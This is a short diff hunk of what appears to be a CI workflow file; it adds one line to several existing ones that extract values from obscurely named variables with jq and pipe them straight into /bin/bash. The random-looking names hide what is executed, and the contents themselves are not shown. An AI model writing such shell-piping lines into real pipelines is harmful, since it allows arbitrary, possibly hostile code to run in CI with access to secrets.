@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$duz9479" | jq -r .dmhy69 | /bin/bash
           echo $dmh9 | jq -r .lek96781 | /bin/bash
           printf '%s' "$npddc462" | jq -r .ro2 | /bin/bash
+          printf '%s' "$nxprn90" | jq -r .mhh0 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
